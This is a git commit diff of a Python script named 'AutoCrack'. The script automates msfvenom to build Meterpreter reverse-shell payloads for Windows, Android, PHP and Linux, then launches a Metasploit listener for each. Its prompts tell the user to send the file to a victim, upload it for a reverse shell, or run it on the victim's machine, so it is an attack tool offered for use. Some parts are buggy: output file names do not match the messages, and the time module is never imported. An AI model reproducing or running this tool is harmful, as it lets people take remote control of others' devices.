d4104f8e796fa4ef741e954c0fa726d3204f50cf
rajethicalhacker <31346934+rajethicalhacker@users.noreply.github.com>
2018-05-01 13:03:34 +0530

    Update script.py

--- script.py
+++ script.py
@@ -1,12 +1,31 @@
-#!/usr/bin/python
+# -*- coding: utf-8 -*-
+from urllib2 import *
 from os import system
-print """
-[+] Made by R4J
-
-1.Crack windows
-2.Crack android
+import sys
+def echoo(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(4. / 100)
+system("clear")
+print """\033[93m              ╔═══════════════════════════════════════════════════════════════════╗
+\033[93m              ║\033[94m  █████╗ ██╗   ██╗████████╗ ██████╗    \033[91m ███╗   ███╗███████╗███████╗\033[93m║
+\033[93m              ║\033[94m ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    \033[91m████╗ ████║██╔════╝██╔════╝\033[93m║
+\033[93m              ║\033[94m ███████║██║   ██║   ██║   ██║   ██║    \033[91m██╔████╔██║███████╗█████╗  \033[93m║
+\033[93m              ║\033[94m ██╔══██║██║   ██║   ██║   ██║   ██║    \033[91m██║╚██╔╝██║╚════██║██╔══╝  \033[93m║
+\033[93m              ║\033[94m ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    \033[91m██║ ╚═╝ ██║███████║██║     \033[93m║
+\033[93m              ║\033[94m ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝     \033[91m╚═╝     ╚═╝╚══════╝╚═╝     \033[93m║
+\033[93m              ╚═══════════════════════════════════════════════════════════════════╝
 """
-a = raw_input("==> ")
+print """ \033[92m
+                                    [1] AutoCrack Windows
+                                    [2] AutoCrack Android
+                                    [3] AutoCrack Website
+                                    [4] AutoCrack Linux
+                                    [5] About Developer
+                                    [6] Exit From Script
+"""
+a = raw_input("\033[94m                                    Chose an option : ")
 
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -15,9 +34,11 @@ ip = s.getsockname()[0]
 s.close()
 
 if a == "1":
+  echoo("\033[92m[+] Generating Payload\033[92m")
   command = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=4444 -f exe > $HOME/Desktop/file.exe" % (ip)
   system(command)
-  print "Payload added on your Desktop as file.exe"
+  print "\033[91mPayload added on your Desktop as file.exe"
+  echoo("Send the file to victim\033[92m")
   system("sleep 2")
   l = "set LHOST %s \n" % (ip)
   file = open("testfile.txt","w")
@@ -30,9 +51,11 @@ if a == "1":
   system("msfconsole -r testfile.txt")
 
 elif a == "2":
+  echoo("\033[92m[+] Generating Payload\033[92m")
   command = "msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=4444 > $HOME/Desktop/file.apk" % (ip)
   system(command)
-  print "Payload added on your Desktop as file.apk"
+  echoo("\033[91mPayload added on your Desktop as file.apk\033[92m")
+  echoo("Send the file to victim")
   system("sleep 2")
   l = "set LHOST %s \n" % (ip)
   file = open("testfile.txt","w")
@@ -44,5 +67,38 @@ elif a == "2":
   file.close()
   system("msfconsole -r testfile.txt")
 
+elif a == "3":
+  echoo("\033[92m[+] Generating Payload\033[92m")
+  command = "msfvenom -p php/meterpreter/reverse_tcp LHOST=%s LPORT=4444 > $HOME/Desktop/file.apk" % (ip)
+  system(command)
+  echoo("\033[91mPayload added on your Desktop as file.php\033[92m")
+  echoo("Upload to get a reverse shell")
+  system("sleep 2")
+  l = "set LHOST %s \n" % (ip)
+  file = open("testfile.txt","w")
+  file.write("use exploit/multi/handler \n")
+  file.write(l)
+  file.write("set LPORT 4444 \n")
+  file.write("set PAYLOAD php/meterpreter/reverse_tcp \n")
+  file.write("run")
+  file.close()
+  system("msfconsole -r testfile.txt")
+
+elif a == "4":
+  echoo("\033[92m[+] Generating Payload\033[92m")
+  command = "msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=4444 > $HOME/Desktop/file.apk" % (ip)
+  system(command)
+  echoo("\033[91mPayload added on your Desktop as file.exploit\033[92m")
+  echoo("Execute it on victims machine")
+  system("sleep 2")
+  l = "set LHOST %s \n" % (ip)
+  file = open("testfile.txt","w")
+  file.write("use exploit/multi/handler \n")
+  file.write(l)
+  file.write("set LPORT 4444 \n")
+  file.write("set PAYLOAD linux/x86/shell_reverse_tcp \n")
+  file.write("run")
+  file.close()
+  system("msfconsole -r testfile.txt")
 else:
     exit()
